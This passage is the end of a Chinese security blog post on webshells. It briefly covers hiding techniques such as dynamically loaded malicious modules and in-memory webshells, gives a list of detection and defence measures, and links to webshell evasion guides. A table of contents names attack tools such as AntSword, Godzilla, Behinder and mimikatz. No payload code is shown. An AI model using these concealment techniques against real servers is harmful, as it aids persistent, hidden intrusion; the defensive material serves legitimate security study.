+<li><p>动态加载:将恶意代码以库、插件或模块的形式动态加载到受害系统中.这种技术使恶意代码不会一直存在于磁盘上,减少了被杀软件扫描和检测的可能性.</p>
+</li>
+</ul>
+</li>
+<li><p>内存马:</p>
+<ol>
+<li>它不像传统的Web Shell一样将恶意代码写入磁盘文件中，而是将代码直接加载到服务器的内存中运行。</li>
+</ol>
+</li>
+</ol>
+<h2 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h2><ol>
+<li>文件完整性监测:定期检查服务器和Web应用程序文件的完整性,比较当前文件与原始文件的散列值或签名.如果发现任何未经授权的更改或添加的文件,可能是恶意<code>WebShell</code>的迹象.</li>
+<li>强密码策略:确保使用强密码来保护服务器和Web应用程序的账户.强密码应该包含足够长度、大小写字母、数字和特殊字符的组合,并且定期更换密码.</li>
+<li>文件上传过滤:在Web应用程序中实施严格的文件上传过滤机制,验证上传的文件类型和内容.限制允许上传的文件扩展名,并进行文件内容的检查,以避免上传恶意<code>WebShell</code>文件.</li>
+<li>输入验证和过滤:对Web应用程序的用户输入进行严格的验证和过滤,以防止任意文件上传等攻击.移除或转义用户输入中的特殊字符和命令注入漏洞,以减少<code>WebShell</code>风险.</li>
+<li>实时日志监控和分析:监控Web服务器日志和应用程序日志,检查异常的请求、访问行为和错误信息.建立实时告警系统,以便及时检测和响应<code>WebShell</code>攻击.</li>
+<li>安全软件和防火墙:使用安全软件和防火墙来阻止对Web服务器的未经授权访问和攻击.这些工具可以检测并阻止恶意代码的执行,同时提供实时的入侵检测和防御功能.</li>
+<li>定期安全审计:定期对服务器和Web应用程序进行安全审计,包括代码审查、漏洞扫描和渗透测试等.这有助于及时发现和修复潜在的<code>WebShell</code>漏洞.</li>
+</ol>
+
+<div class="article-footer fs14">
+    <section id="references">
+      <div class="header"><span>参考资料</span></div>
+      <div class="body">
+        <ul>
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/07/shell.html">PHP webshell 免杀姿势总结-国光</a></p>
+
+        </li>
+        
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
+
+        </li>
+        
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://github.com/AabyssZG/WebShell-Bypass-Guide">从零学习WebShell免杀手册系列</a></p>
+
+        </li>
+        </ul>
+      </div>
+    </section>
+    
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/02/20/449cb93/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/02/20/449cb93/&title=Security-WebShell介绍及使用 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402192140789.png&summary=
+    总字符数: 31.50K 
+    
+    
+    代码: 15.47K, 文本: 8.27K
+    
+    
+    预计阅读时间: 1.72 小时
+    
+    
+
+
+
+简介
+WebShell是一种以网页文件..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=Security-WebShell介绍及使用 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/02/20/449cb93/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/02/20/449cb93/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/02/22/449cb93/">Security-反弹Shell大全及使用</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/02/18/693474ed/">Linux-Shell编程从0到1</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2024\02\22\449cb93\" title="Security-反弹Shell大全及使用"><span class="title">Security-反弹Shell大全及使用</span></a><a class="item" href="\2024\02\08\c44eef61\" title="Security-会话授权"><span class="title">Security-会话授权</span></a><a class="item" href="\2024\02\16\449cb93\" title="Security-主动信息收集"><span class="title">Security-主动信息收集</span></a><a class="item" href="\2024\02\10\c44eef61\" title="Security-网安专业术语篇"><span class="title">Security-网安专业术语篇</span></a><a class="item" href="\2024\09\24\3c3f9499\" title="CS-Cobalt Strike必备知识"><span class="title">CS-Cobalt Strike必备知识</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E7%89%B9%E7%82%B9"><span class="toc-text">WebShell特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E5%88%86%E7%B1%BB"><span class="toc-text">WebShell分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">常见一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asp"><span class="toc-text">asp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aspx"><span class="toc-text">aspx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp"><span class="toc-text">jsp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">WebShell管理工具的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91-AntSword"><span class="toc-text">蚁剑(AntSword)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E7%9A%84%E4%B8%8B%E8%BD%BD"><span class="toc-text">蚁剑的下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E7%9A%84%E5%AE%89%E8%A3%85"><span class="toc-text">蚁剑的安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E7%95%8C%E9%9D%A2"><span class="toc-text">蚁剑界面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91-AntSword-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">蚁剑(AntSword)的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE"><span class="toc-text">代理设置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0Shell"><span class="toc-text">添加Shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6"><span class="toc-text">插件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89-Godzilla"><span class="toc-text">哥斯拉(Godzilla)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-text">使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90WebShell"><span class="toc-text">生成WebShell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5WebShell"><span class="toc-text">连接WebShell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-text">设置代理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E9%85%8D%E7%BD%AE"><span class="toc-text">请求配置</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-text">配置信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8D%8F%E8%AE%AE%E5%A4%B4"><span class="toc-text">全局协议头</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86"><span class="toc-text">全局代理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E4%BD%93%E8%AE%BE%E7%BD%AE"><span class="toc-text">字体设置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE"><span class="toc-text">核心配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%A7%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-text">大文件配置</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP"><span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-text">基础信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="toc-text">文件管理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86"><span class="toc-text">数据库管理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%AF%A6%E6%83%85"><span class="toc-text">网络详情</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Zip"><span class="toc-text">Zip</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PSuperServer"><span class="toc-text">PSuperServer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PWebShellScan"><span class="toc-text">PWebShellScan</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PMeterpreter"><span class="toc-text">PMeterpreter</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BypassOpenBasedir"><span class="toc-text">BypassOpenBasedir</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PAttackFPM"><span class="toc-text">PAttackFPM</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BypassDisableFunctions"><span class="toc-text">BypassDisableFunctions</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#P-Eval-Code"><span class="toc-text">P_Eval_Code</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PortScan"><span class="toc-text">PortScan</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RealCmd"><span class="toc-text">RealCmd</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSP"><span class="toc-text">JSP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF-1"><span class="toc-text">基础信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MemoryShell"><span class="toc-text">MemoryShell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EnumDatabaseConn"><span class="toc-text">EnumDatabaseConn</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Screen"><span class="toc-text">Screen</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PetitPotam"><span class="toc-text">PetitPotam</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ServletManage"><span class="toc-text">ServletManage</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ShellcodeLoader"><span class="toc-text">ShellcodeLoader</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JarLoader"><span class="toc-text">JarLoader</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mimikatz"><span class="toc-text">mimikatz</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E-Benhinder"><span class="toc-text">冰蝎(Benhinder)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D"><span class="toc-text">文件介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E5%BB%BA%E8%BF%9E%E6%8E%A5"><span class="toc-text">新建连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81"><span class="toc-text">修改默认密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">虚拟终端</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86-1"><span class="toc-text">文件管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86-1"><span class="toc-text">数据库管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BB%A3%E7%A0%81"><span class="toc-text">自定义代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-text">备忘录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">注入内存马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-text">代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weevely"><span class="toc-text">Weevely</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-text">简单使用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShells"><span class="toc-text">WebShells</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E9%9A%90%E8%97%8F"><span class="toc-text">WebShell隐藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-text">检测与防御</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
